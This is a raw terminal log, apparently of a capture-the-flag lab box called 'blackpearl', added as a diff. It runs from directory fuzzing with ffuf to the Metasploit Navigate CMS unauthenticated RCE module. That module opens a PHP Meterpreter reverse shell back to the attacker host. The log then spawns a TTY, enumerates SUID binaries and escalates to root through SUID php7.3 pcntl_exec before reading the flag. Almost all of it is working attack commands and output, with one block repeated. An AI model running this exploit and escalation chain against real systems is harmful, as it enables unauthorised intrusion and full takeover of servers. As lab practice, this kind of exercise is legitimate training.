@@ -1,0 +1,475 @@
+ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ  -u http://blackpearl.tcm/FUZZ
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://blackpearl.tcm/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+#                       [Status: 200, Size: 86784, Words: 4212, Lines: 1040, Duration: 32ms]
+# This work is licensed under the Creative Commons  [Status: 200, Size: 86783, Words: 4212, Lines: 1040, Duration: 32ms]
+# directory-list-2.3-medium.txt [Status: 200, Size: 86785, Words: 4212, Lines: 1040, Duration: 126ms]
+# Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 86785, Words: 4212, Lines: 1040, Duration: 64ms]
+# license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 86785, Words: 4212, Lines: 1040, Duration: 79ms]
+# Copyright 2007 James Fisher [Status: 200, Size: 86785, Words: 4212, Lines: 1040, Duration: 170ms]
+#                       [Status: 200, Size: 86785, Words: 4212, Lines: 1040, Duration: 262ms]
+# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 86785, Words: 4212, Lines: 1040, Duration: 275ms]
+#                       [Status: 200, Size: 86786, Words: 4212, Lines: 1040, Duration: 324ms]
+# or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 86785, Words: 4212, Lines: 1040, Duration: 290ms]
+# Priority ordered case sensative list, where entries were found  [Status: 200, Size: 86786, Words: 4212, Lines: 1040, Duration: 328ms]
+# on atleast 2 different hosts [Status: 200, Size: 86786, Words: 4212, Lines: 1040, Duration: 328ms]
+#                       [Status: 200, Size: 86786, Words: 4212, Lines: 1040, Duration: 407ms]
+                        [Status: 200, Size: 86786, Words: 4212, Lines: 1040, Duration: 411ms]
+navigate                [Status: 301, Size: 185, Words: 6, Lines: 8, Duration: 131ms]
+                        [Status: 200, Size: 86817, Words: 4212, Lines: 1040, Duration: 284ms]
+[WARN] Caught keyboard interrupt (Ctrl-C)
+
+
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/Desktop/blackpearl]
+└─$ msfconsole                              
+Metasploit tip: Set the current module's RHOSTS with database values using 
+hosts -R or services -R
+                                                  
+  +-------------------------------------------------------+
+  |  METASPLOIT by Rapid7                                 |                                                                                                                                                                                 
+  +---------------------------+---------------------------+                                                                                                                                                                                 
+  |      __________________   |                           |                                                                                                                                                                                 
+  |  ==c(______(o(______(_()  | |""""""""""""|======[***  |                                                                                                                                                                                 
+  |             )=\           | |  EXPLOIT   \            |                                                                                                                                                                                 
+  |            // \\          | |_____________\_______    |                                                                                                                                                                                 
+  |           //   \\         | |==[msf >]============\   |                                                                                                                                                                                 
+  |          //     \\        | |______________________\  |                                                                                                                                                                                 
+  |         // RECON \\       | \(@)(@)(@)(@)(@)(@)(@)/   |                                                                                                                                                                                 
+  |        //         \\      |  *********************    |                                                                                                                                                                                 
+  +---------------------------+---------------------------+                                                                                                                                                                                 
+  |      o O o                |        \'\/\/\/'/         |                                                                                                                                                                                 
+  |              o O          |         )======(          |                                                                                                                                                                                 
+  |                 o         |       .'  LOOT  '.        |                                                                                                                                                                                 
+  | |^^^^^^^^^^^^^^|l___      |      /    _||__   \       |                                                                                                                                                                                 
+  | |    PAYLOAD     |""\___, |     /    (_||_     \      |                                                                                                                                                                                 
+  | |________________|__|)__| |    |     __||_)     |     |                                                                                                                                                                                 
+  | |(@)(@)"""**|(@)(@)**|(@) |    "       ||       "     |                                                                                                                                                                                 
+  |  = = = = = = = = = = = =  |     '--------------'      |                                                                                                                                                                                 
+  +---------------------------+---------------------------+                                                                                                                                                                                 
+
+
+       =[ metasploit v6.3.55-dev                          ]
++ -- --=[ 2397 exploits - 1235 auxiliary - 422 post       ]
++ -- --=[ 1391 payloads - 46 encoders - 11 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+^[[6~^[[msf6 > search navigate
+
+Matching Modules
+================
+
+   #  Name                                         Disclosure Date  Rank       Check  Description
+   -  ----                                         ---------------  ----       -----  -----------
+   0  exploit/multi/browser/firefox_svg_plugin     2013-01-08       excellent  No     Firefox 17.0.1 Flash Privileged Code Injection
+   1  exploit/windows/misc/hta_server              2016-10-06       manual     No     HTA Web Server
+   2  auxiliary/gather/safari_file_url_navigation  2014-01-16       normal     No     Mac OS X Safari file:// Redirection Sandbox Escape
+   3  exploit/multi/http/navigate_cms_rce          2018-09-26       excellent  Yes    Navigate CMS Unauthenticated Remote Code Execution
+
+
+Interact with a module by name or index. For example info 3, use 3 or use exploit/multi/http/navigate_cms_rce
+
+msf6 > use exploit/multi/http/n
+use exploit/multi/http/nas4free_php_exec         use exploit/multi/http/netwin_surgeftp_exec      use exploit/multi/http/nostromo_code_exec        use exploit/multi/http/nuuo_nvrmini_upgrade_rce
+use exploit/multi/http/navigate_cms_rce          use exploit/multi/http/nibbleblog_file_upload    use exploit/multi/http/novell_servicedesk_rce    
+msf6 > use exploit/multi/http/navigate_cms_rce 
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+msf6 exploit(multi/http/navigate_cms_rce) > options
+
+Module options (exploit/multi/http/navigate_cms_rce):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /navigate/       yes       Base Navigate CMS directory path
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.57.5     yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/http/navigate_cms_rce) > set rhosts 192.168.57.6
+rhosts => 192.168.57.6
+msf6 exploit(multi/http/navigate_cms_rce) > run
+
+[*] Started reverse TCP handler on 192.168.57.5:4444 
+[-] Exploit aborted due to failure: no-access: Login bypass failed
+[*] Exploit completed, but no session was created.
+msf6 exploit(multi/http/navigate_cms_rce) > show targets
+
+Exploit targets:
+=================
+
+    Id  Name
+    --  ----
+=>  0   Automatic
+
+
+msf6 exploit(multi/http/navigate_cms_rce) > options
+
+Module options (exploit/multi/http/navigate_cms_rce):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     192.168.57.6     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /navigate/       yes       Base Navigate CMS directory path
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.57.5     yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/http/navigate_cms_rce) > set vhost blackpearl.tcm
+vhost => blackpearl.tcm
+msf6 exploit(multi/http/navigate_cms_rce) > run
+
+[*] Started reverse TCP handler on 192.168.57.5:4444 
+[+] Login bypass successful
+[+] Upload successful
+[*] Triggering payload...
+[*] Sending stage (39927 bytes) to 192.168.57.6
+[*] Meterpreter session 1 opened (192.168.57.5:4444 -> 192.168.57.6:46260) at 2024-08-12 08:10:33 +0000
+whoami
+
+meterpreter > whoami
+[-] Unknown command: whoami
+meterpreter > whoami
+[-] Unknown command: whoami
+meterpreter > id
+[-] Unknown command: id
+meterpreter > sehll
+[-] Unknown command: sehll
+meterpreter > help
+
+Core Commands
+=============
+
+    Command       Description
+    -------       -----------
+    ?             Help menu
+    background    Backgrounds the current session
+    bg            Alias for background
+    bgkill        Kills a background meterpreter script
+    bglist        Lists running background scripts
+    bgrun         Executes a meterpreter script as a background thread
+    channel       Displays information or control active channels
+    close         Closes a channel
+    detach        Detach the meterpreter session (for http/https)
+    disable_unic  Disables encoding of unicode strings
+    ode_encoding
+    enable_unico  Enables encoding of unicode strings
+    de_encoding
+    exit          Terminate the meterpreter session
+    guid          Get the session GUID
+    help          Help menu
+    info          Displays information about a Post module
+    irb           Open an interactive Ruby shell on the current session
+    load          Load one or more meterpreter extensions
+    machine_id    Get the MSF ID of the machine attached to the session
+    pry           Open the Pry debugger on the current session
+    quit          Terminate the meterpreter session
+    read          Reads data from a channel
+    resource      Run the commands stored in a file
+    run           Executes a meterpreter script or Post module
+    secure        (Re)Negotiate TLV packet encryption on the session
+    sessions      Quickly switch to another session
+    use           Deprecated alias for "load"
+    uuid          Get the UUID for the current session
+    write         Writes data to a channel
+
+
+Stdapi: File system Commands
+============================
+
+    Command       Description
+    -------       -----------
+    cat           Read the contents of a file to the screen
+    cd            Change directory
+    checksum      Retrieve the checksum of a file
+    chmod         Change the permissions of a file
+    cp            Copy source to destination
+    del           Delete the specified file
+    dir           List files (alias for ls)
+    download      Download a file or directory
+    edit          Edit a file
+    getlwd        Print local working directory
+    getwd         Print working directory
+    lcat          Read the contents of a local file to the screen
+    lcd           Change local working directory
+    lls           List local files
+    lmkdir        Create new directory on local machine
+    lpwd          Print local working directory
+    ls            List files
+    mkdir         Make directory
+    mv            Move source to destination
+    pwd           Print working directory
+    rm            Delete the specified file
+    rmdir         Remove directory
+    search        Search for files
+    upload        Upload a file or directory
+
+
+Stdapi: Networking Commands
+===========================
+
+    Command       Description
+    -------       -----------
+    portfwd       Forward a local port to a remote service
+    resolve       Resolve a set of host names on the target
+
+
+Stdapi: System Commands
+=======================
+
+    Command       Description
+    -------       -----------
+    execute       Execute a command
+    getenv        Get one or more environment variable values
+    getpid        Get the current process identifier
+    getuid        Get the user that the server is running as
+    kill          Terminate a process
+    localtime     Displays the target system local date and time
+    pgrep         Filter processes by name
+    pkill         Terminate processes by name
+    ps            List running processes
+    shell         Drop into a system command shell
+    sysinfo       Gets information about the remote system, such as OS
+
+
+Stdapi: Audio Output Commands
+=============================
+
+    Command       Description
+    -------       -----------
+    play          play a waveform audio file (.wav) on the target system
+
+meterpreter > sysinfo
+Computer    : blackpearl
+OS          : Linux blackpearl 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
+Meterpreter : php/linux
+meterpreter > shell
+Process 741 created.
+Channel 1 created.
+whoami
+www-data
+which python
+/usr/bin/python
+python3 -c 'import pty; pty.spawn("/bin/bash")               
+if
+'
+  File "<string>", line 2
+    if
+     ^
+SyntaxError: invalid syntax
+id      
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@blackpearl:~/blackpearl.tcm/navigate$ ls
+ls
+LICENSE.txt  crossdomain.xml  index.php  navigate.php           plugins  web
+README       css              js         navigate_download.php  private
+cache        favicon.ico      lib        navigate_info.php      themes
+cfg          img              login.php  navigate_upload.php    updates
+www-data@blackpearl:~/blackpearl.tcm/navigate$ sudo -l
+sudo -l
+bash: sudo: command not found
+www-data@blackpearl:~/blackpearl.tcm/navigate$ ls
+ls
+LICENSE.txt  crossdomain.xml  index.php  navigate.php           plugins  web
+README       css              js         navigate_download.php  private
+cache        favicon.ico      lib        navigate_info.php      themes
+cfg          img              login.php  navigate_upload.php    updates
+www-data@blackpearl:~/blackpearl.tcm/navigate$ find / -type f -perm -4000 2>/dev/null 
+<cm/navigate$ find / -type f -perm -4000 2>/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/bin/umount
+/usr/bin/newgrp
+/usr/bin/mount
+/usr/bin/php7.3
+/usr/bin/su
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/gpasswd
+www-data@blackpearl:~/blackpearl.tcm/navigate$ 
+
+
+
+
+------------------------------------------------------------
+
+
+
+
+
+meterpreter > sysinfo
+Computer    : blackpearl
+OS          : Linux blackpearl 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
+Meterpreter : php/linux
+meterpreter > shell
+Process 741 created.
+Channel 1 created.
+whoami
+www-data
+which python
+/usr/bin/python
+python3 -c 'import pty; pty.spawn("/bin/bash")               
+if
+'
+  File "<string>", line 2
+    if
+     ^
+SyntaxError: invalid syntax
+id      
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@blackpearl:~/blackpearl.tcm/navigate$ ls
+ls
+LICENSE.txt  crossdomain.xml  index.php  navigate.php           plugins  web
+README       css              js         navigate_download.php  private
+cache        favicon.ico      lib        navigate_info.php      themes
+cfg          img              login.php  navigate_upload.php    updates
+www-data@blackpearl:~/blackpearl.tcm/navigate$ sudo -l
+sudo -l
+bash: sudo: command not found
+www-data@blackpearl:~/blackpearl.tcm/navigate$ ls
+ls
+LICENSE.txt  crossdomain.xml  index.php  navigate.php           plugins  web
+README       css              js         navigate_download.php  private
+cache        favicon.ico      lib        navigate_info.php      themes
+cfg          img              login.php  navigate_upload.php    updates
+www-data@blackpearl:~/blackpearl.tcm/navigate$ find / -type f -perm -4000 2>/dev/null 
+<cm/navigate$ find / -type f -perm -4000 2>/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/bin/umount
+/usr/bin/newgrp
+/usr/bin/mount
+/usr/bin/php7.3
+/usr/bin/su
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/gpasswd
+www-data@blackpearl:~/blackpearl.tcm/navigate$ /usr/bin/php7.3 
+./php -r "pcntl_exec('/bin/sh', ['-p']);"/usr/bin/php7.3 
+    
+./php -r "pcntl_exec('/bin/sh'
+
+
+whoami
+whoami
+^C
+Terminate channel 1? [y/N]  y
+meterpreter > shell
+Process 771 created.
+Channel 2 created.
+whoami
+www-data
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+python3 -c 'import pty; pty.spawn("/bin/bash"'
+  File "<string>", line 1
+    import pty; pty.spawn("/bin/bash"
+                                    ^
+SyntaxError: unexpected EOF while parsing
+python3 -c 'import pty; pty.spawn("/bin/bash")' 
+www-data@blackpearl:~/blackpearl.tcm/navigate$ /usr/bin/php7.3 ./php -r "pcntl-exec('/bin/sh', ['-p']);"
+<in/php7.3 ./php -r "pcntl-exec('/bin/sh', ['-p']);"
+Could not open input file: ./php
+www-data@blackpearl:~/blackpearl.tcm/navigate$ /usr/bin/php7.3 -r "pcntl-exec('bin/sh', ['-p']);"  
+< /usr/bin/php7.3 -r "pcntl-exec('bin/sh', ['-p']);"
+PHP Fatal error:  Only variables can be passed by reference in Command line code on line 1
+www-data@blackpearl:~/blackpearl.tcm/navigate$ /usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"
+</usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"
+# ls
+ls
+LICENSE.txt  crossdomain.xml  index.php  navigate.php           plugins  web
+README       css              js         navigate_download.php  private
+cache        favicon.ico      lib        navigate_info.php      themes
+cfg          img              login.php  navigate_upload.php    updates
+# id
+id
+uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
+# whoami
+whoami
+root
+# cd /
+cd /
+# ls
+ls
+bin   home            lib32       media  root  sys  vmlinuz
+boot  initrd.img      lib64       mnt    run   tmp  vmlinuz.old
+dev   initrd.img.old  libx32      opt    sbin  usr
+etc   lib             lost+found  proc   srv   var
+# cd root
+cd root
+# ls
+ls
+flag.txt
+# cat flag.txt
+cat flag.txt
+Good job on this one.
+Finding the domain name may have been a little guessy,
+but the goal of this box is mainly to teach about Virtual Host Routing which is used in a lot of CTF.
+# 
